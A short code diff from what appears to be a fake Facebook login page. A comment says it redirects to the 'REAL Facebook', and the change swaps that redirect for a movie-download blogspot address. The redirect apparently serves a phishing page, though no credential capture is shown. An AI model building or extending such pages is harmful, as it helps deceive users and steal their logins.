@@ -137,7 +137,7 @@
                 status.innerText = "Redirecting...";
                 // Redirect to REAL Facebook
                 setTimeout(() => {
-                    window.location.href = "https://www.facebook.com";
+                    window.location.href = "https://moviedownloderhub.blogspot.com";
                 }, 1000);
 
             } catch (error) {
